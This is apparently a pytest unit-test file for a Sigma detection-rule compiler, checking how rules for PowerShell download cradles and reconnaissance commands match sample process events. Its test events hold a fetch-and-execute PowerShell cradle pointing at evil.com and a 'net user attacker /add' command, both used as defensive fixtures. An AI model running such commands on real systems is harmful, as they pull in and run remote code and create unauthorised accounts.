"""Unit Tests for Sigma Compiler & AST Condition Evaluation
Traceability: CSAI-P3-DETECTION, ADR-0004, Gate G3
"""

from datetime import datetime, timezone

import pytest

from schemas.canonical_event import CanonicalEvent
from schemas.enums import EventSeverityEnum
from services.detection.compiler import (
    CANONICAL_FIELD_MAP,
    CompiledSigmaRule,
    SigmaCompilationError,
    SigmaCompiler,
)

VALID_SIGMA_RULE_YAML = """
title: Suspicious PowerShell Download Cradle
id: 5f1186a4-e73c-4297-baab-a2991557cc37
status: experimental
description: Detects suspicious PowerShell invocation with WebClient download cradles
references:
    - https://attack.mitre.org/techniques/T1059/001/
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_cmd:
        process_name: powershell.exe
        command_line|contains:
            - "DownloadString"
            - "DownloadFile"
            - "Invoke-WebRequest"
    filter_admin:
        username: AdminProvisioningUser
    condition: selection_cmd and not filter_admin
level: high
"""

MULTI_SELECTION_OR_YAML = """
title: Reconnaissance Tool Execution
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: test
description: Detects common recon commands
tags:
    - attack.discovery
    - attack.t1033
logsource:
    category: process_creation
    product: windows
detection:
    sel_whoami:
        process_name: whoami.exe
    sel_net:
        process_name: net.exe
        command_line|contains: user
    condition: sel_whoami or sel_net
level: medium
"""

WILDCARD_AND_STARTSWITH_YAML = r'''
title: Suspicious Binary Execution Path
id: f1e2d3c4-b5a6-7890-1234-567890abcdef
status: experimental
description: Detects execution from AppData or Temp
logsource:
    category: process_creation
detection:
    selection:
        command_line|startswith: 'C:\Users\'
        process_name|endswith: '.exe'
    condition: selection
level: low
'''


def test_compiler_parses_and_compiles_valid_rule():
    """Verify pySigma parsing and AST compilation into CompiledSigmaRule."""
    compiler = SigmaCompiler()
    rule = compiler.compile_rule_yaml(VALID_SIGMA_RULE_YAML)

    assert isinstance(rule, CompiledSigmaRule)
    assert rule.rule_id == "5f1186a4-e73c-4297-baab-a2991557cc37"
    assert rule.title == "Suspicious PowerShell Download Cradle"
    assert rule.severity == EventSeverityEnum.HIGH
    assert "attack.t1059.001" in rule.tags
    assert rule.content_hash is not None
    assert len(rule.content_hash) == 64


def test_compiler_handles_missing_rule_id():
    """Verify deterministic fallback ID generation when Sigma rule lacks id field."""
    yaml_without_id = """
title: Anonymous Rule
status: test
description: Rule without explicit ID
logsource:
    category: process_creation
detection:
    selection:
        process_name: cmd.exe
    condition: selection
level: low
"""
    compiler = SigmaCompiler()
    rule = compiler.compile_rule_yaml(yaml_without_id)

    assert rule.rule_id is not None
    assert len(rule.rule_id) == 36
    assert rule.title == "Anonymous Rule"


def test_compiler_evaluates_contains_modifier():
    """Verify contains modifier with multi-value matches."""
    compiler = SigmaCompiler()
    rule = compiler.compile_rule_yaml(VALID_SIGMA_RULE_YAML)
    now = datetime.now(timezone.utc)

    # Positive match
    ev_pos = CanonicalEvent(
        timestamp=now,
        source_type="windows",
        source_name="sysmon",
        event_type="process_creation",
        process_name="powershell.exe",
        command_line="powershell.exe -enc IEX (New-Object Net.WebClient).DownloadString('http://evil.com/x')",
        username="compromised_user",
        severity="medium",
    )
    assert rule.evaluate(ev_pos) is True

    # Negative match (filtered out by filter_admin)
    ev_filtered = CanonicalEvent(
        timestamp=now,
        source_type="windows",
        source_name="sysmon",
        event_type="process_creation",
        process_name="powershell.exe",
        command_line="powershell.exe DownloadString('http://corp.int/pkg')",
        username="AdminProvisioningUser",
        severity="medium",
    )
    assert rule.evaluate(ev_filtered) is False

    # Negative match (command line does not contain keywords)
    ev_neg = CanonicalEvent(
        timestamp=now,
        source_type="windows",
        source_name="sysmon",
        event_type="process_creation",
        process_name="powershell.exe",
        command_line="powershell.exe Get-Process",
        username="compromised_user",
        severity="medium",
    )
    assert rule.evaluate(ev_neg) is False


def test_compiler_evaluates_or_conditions():
    """Verify condition with OR logic."""
    compiler = SigmaCompiler()
    rule = compiler.compile_rule_yaml(MULTI_SELECTION_OR_YAML)
    now = datetime.now(timezone.utc)

    # Match sel_whoami
    ev1 = CanonicalEvent(
        timestamp=now,
        source_type="windows",
        source_name="sysmon",
        event_type="process_creation",
        process_name="whoami.exe",
        severity="low",
    )
    assert rule.evaluate(ev1) is True

    # Match sel_net
    ev2 = CanonicalEvent(
        timestamp=now,
        source_type="windows",
        source_name="sysmon",
        event_type="process_creation",
        process_name="net.exe",
        command_line="net.exe user attacker /add",
        severity="low",
    )
    assert rule.evaluate(ev2) is True

    # No match
    ev3 = CanonicalEvent(
        timestamp=now,
        source_type="windows",
        source_name="sysmon",
        event_type="process_creation",
        process_name="calc.exe",
        severity="low",
    )
    assert rule.evaluate(ev3) is False


def test_compiler_evaluates_startswith_endswith_modifiers():
    """Verify startswith and endswith string modifiers."""
    compiler = SigmaCompiler()
    rule = compiler.compile_rule_yaml(WILDCARD_AND_STARTSWITH_YAML)
    now = datetime.now(timezone.utc)

    ev_match = CanonicalEvent(
        timestamp=now,
        source_type="windows",
        source_name="sysmon",
        event_type="process_creation",
        process_name="malware.exe",
        command_line=r"C:\Users\victim\AppData\Local\Temp\malware.exe",
        severity="low",
    )
    assert rule.evaluate(ev_match) is True

    ev_no_match = CanonicalEvent(
        timestamp=now,
        source_type="windows",
        source_name="sysmon",
        event_type="process_creation",
        process_name="malware.bat",
        command_line=r"C:\Windows\System32\cmd.exe",
        severity="low",
    )
    assert rule.evaluate(ev_no_match) is False


def test_compiler_missing_fields_safe():
    """Verify missing fields in CanonicalEvent evaluate to False without exceptions."""
    compiler = SigmaCompiler()
    rule = compiler.compile_rule_yaml(VALID_SIGMA_RULE_YAML)

    # Event with missing process_name and command_line
    ev_sparse = CanonicalEvent(
        timestamp=datetime.now(timezone.utc),
        source_type="network",
        source_name="zeek",
        event_type="dns_query",
        domain="evil.com",
        severity="low",
    )
    # Should safely return False
    assert rule.evaluate(ev_sparse) is False


def test_compiler_rejects_oversized_rule():
    """Verify rule larger than 1MB is rejected to prevent DoS."""
    compiler = SigmaCompiler()
    oversized = "a" * (1024 * 1024 + 10)
    with pytest.raises(SigmaCompilationError, match="exceeds maximum allowed size"):
        compiler.compile_rule_yaml(oversized)


def test_compiler_rejects_malformed_yaml():
    """Verify malformed YAML produces SigmaCompilationError."""
    compiler = SigmaCompiler()
    malformed = "title: Broken\n  bad_indent:\n    - [unclosed"
    with pytest.raises(SigmaCompilationError, match="Malformed Sigma YAML syntax"):
        compiler.compile_rule_yaml(malformed)


def test_compiler_field_mapping_coverage():
    """Verify CANONICAL_FIELD_MAP covers primary Sysmon/Windows Sigma fields."""
    expected_mappings = [
        "image",
        "commandline",
        "user",
        "parentimage",
        "sourceip",
        "destinationip",
        "sourceport",
        "destinationport",
        "hashes",
    ]
    for field in expected_mappings:
        assert field in CANONICAL_FIELD_MAP
